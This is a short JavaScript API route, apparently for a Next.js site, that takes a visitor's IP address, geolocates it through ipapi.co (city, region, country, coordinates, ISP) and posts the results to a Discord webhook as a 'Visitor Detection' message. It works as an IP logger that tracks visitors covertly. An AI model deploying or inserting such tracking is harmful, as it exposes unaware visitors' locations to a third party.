export async function POST(request) {
  try {
    const body = await request.json();
    const { ip, timestamp = new Date().toISOString() } = body;
    
    const webhookURL = process.env.spiderwebb;
    
    if (!webhookURL) {
      return new Response(
        JSON.stringify({ success: false, error: "Webhook URL not configured" }),
        { status: 500, headers: { "Content-Type": "application/json" } }
      );
    }
    
    let locationData = null;
    
    if (ip) {
      try {
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        locationData = await geoResponse.json();
      } catch(e) {
        console.error('Failed to fetch location data');
      }
    }
    
    const fields = [];
    
    fields.push({
      name: "🌐 IP Address",
      value: ip || "Not provided",
      inline: true
    });
    
    if (locationData && !locationData.error) {
      const locationParts = [];
      if (locationData.city) locationParts.push(locationData.city);
      if (locationData.region) locationParts.push(locationData.region);
      if (locationData.country_name) locationParts.push(locationData.country_name);
      if (locationData.latitude && locationData.longitude) {
        locationParts.push(`📍 ${locationData.latitude}, ${locationData.longitude}`);
      }
      
      if (locationParts.length) {
        fields.push({
          name: "📍 Location",
          value: locationParts.join(", "),
          inline: true
        });
      }
      
      if (locationData.org) {
        fields.push({
          name: "🏢 ISP",
          value: locationData.org,
          inline: true
        });
      }
    }
    
    const embed = {
      title: "🌐 Visitor Detection",
      color: 0x5865f2,
      fields: fields,
      footer: {
        text: "Detection Time"
      },
      timestamp: timestamp
    };
    
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embed] }),
    });
    
    if (!response.ok) {
      throw new Error(`Webhook failed with status: ${response.status}`);
    }
    
    return new Response(
      JSON.stringify({ success: true, message: "Data sent to Discord successfully" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }
}